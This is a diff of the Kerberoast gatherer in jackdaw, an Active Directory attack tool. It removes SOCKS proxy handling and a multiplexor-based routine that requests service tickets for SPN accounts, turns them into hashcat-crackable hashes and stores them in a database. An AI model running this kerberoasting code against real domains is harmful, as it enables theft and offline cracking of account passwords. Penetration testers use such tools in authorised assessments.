@@ -3,8 +3,6 @@ import platform
 import logging
 from urllib.parse import urlparse, parse_qs
 
-from minikerberos.common.proxy import KerberosProxy
-
 from jackdaw import logger
 from jackdaw.dbmodel.kerberoast import Kerberoast as KerberoastTable
 from jackdaw.dbmodel.adinfo import ADInfo
@@ -19,9 +17,8 @@ from minikerberos.security import KerberosUserEnum, APREPRoast, Kerberoast
 from minikerberos.common.creds import KerberosCredential
 from minikerberos.common.url import KerberosClientURL
 
-from msldap.authentication.kerberos.gssapi import get_gssapi, GSSWrapToken, KRB5_MECH_INDEP_TOKEN
+from asyauth.protocols.kerberos.gssapi import get_gssapi, GSSWrapToken, KRB5_MECH_INDEP_TOKEN
 from minikerberos.protocol.asn1_structs import AP_REQ, TGS_REQ
-from asysocks.common.clienturl import SocksClientURL
 
 from jackdaw.gatherer.progress import *
 
@@ -31,7 +28,6 @@ class KerberoastGatherer:
 		self.ad_id = ad_id
 		self.kerb_url = kerb_url
 		self.kerb_mgr = None
-		self.proxy = proxy
 		self.domain_name = domain_name
 		self.progress_queue = progress_queue
 		self.show_progress = show_progress
@@ -116,64 +112,6 @@ class KerberoastGatherer:
 			self.db_session.commit()
 
 			return True, None
-		except Exception as e:
-			return None, e
-
-	async def kerberoast_multiplexor(self):
-		try:
-			from multiplexor.operator.external.sspi import KerberosSSPIClient
-			from multiplexor.operator import MultiplexorOperator
-		except ImportError as error:
-			return None, Exception('Failed to import multiplexor module! You will need to install multiplexor to get this working!')
-
-		try:
-			ws_logger = logging.getLogger('websockets')
-			ws_logger.setLevel(100)
-			url_e = urlparse(self.kerb_url)
-			agentid = url_e.path.replace('/','')
-			operator = MultiplexorOperator(self.kerb_url)
-			await operator.connect()
-			#creating virtual sspi server
-			for uid in self.targets_spn:
-				try:
-					server_info = await operator.start_sspi(agentid)
-					#print(server_info)
-					sspi_url = 'ws://%s:%s' % (server_info['listen_ip'], server_info['listen_port'])
-					#print(sspi_url)
-					ksspi = KerberosSSPIClient(sspi_url)
-					await ksspi.connect()
-
-					apreq, err = await ksspi.authenticate(self.targets_spn[uid].get_formatted_pname())
-					if err is not None:
-						logger.debug('[SPN-MP] error occurred while roasting %s: %s' % (self.targets_spn[uid].get_formatted_pname(), err))
-						continue
-					unwrap = KRB5_MECH_INDEP_TOKEN.from_bytes(apreq)
-					aprep = AP_REQ.load(unwrap.data[2:]).native
-					
-					t = KerberoastTable.from_hash(self.ad_id, uid, TGSTicket2hashcat(aprep))
-					self.db_session.add(t)
-
-					self.total_targets_finished += 1
-					if self.progress_queue is not None:
-						msg = GathererProgress()
-						msg.type = GathererProgressType.KERBEROAST
-						msg.msg_type = MSGTYPE.PROGRESS 
-						msg.adid = self.ad_id
-						msg.domain_name = self.domain_name
-						msg.total = self.total_targets
-						msg.total_finished = self.total_targets_finished
-						msg.step_size = 1
-						await self.progress_queue.put(msg)
-
-				except Exception as e:
-					logger.debug('[SPN-MP] Error while roasting %s. %s' % (uid, e))
-				finally:
-					try:
-						await ksspi.disconnect()
-					except:
-						pass
-
-			self.db_session.commit()
 		except Exception as e:
 			return None, e
 
@@ -306,10 +244,6 @@ class KerberoastGatherer:
 			
 			if isinstance(self.kerb_url, KerberosClientURL):
 				self.kerb_mgr = self.kerb_url
-				if self.proxy is not None:
-					pu = SocksClientURL.from_urls(self.proxy)
-					p = KerberosProxy(pu, None, type='SOCKS')
-					self.kerb_mgr.proxy = p
 
 			elif isinstance(self.kerb_url, str):
 				if self.kerb_url == 'auto':
@@ -327,10 +261,6 @@ class KerberoastGatherer:
 				
 				elif self.kerb_url.startswith('kerberos'):
 					self.kerb_mgr = KerberosClientURL.from_url(self.kerb_url)
-					if self.proxy is not None:
-						pu = SocksClientURL.from_urls(self.proxy)
-						p = KerberosProxy(pu, None, type='SOCKS')
-						self.kerb_mgr.proxy = p
 
 					_, err = await self.asreproast()
 					if err is not None:
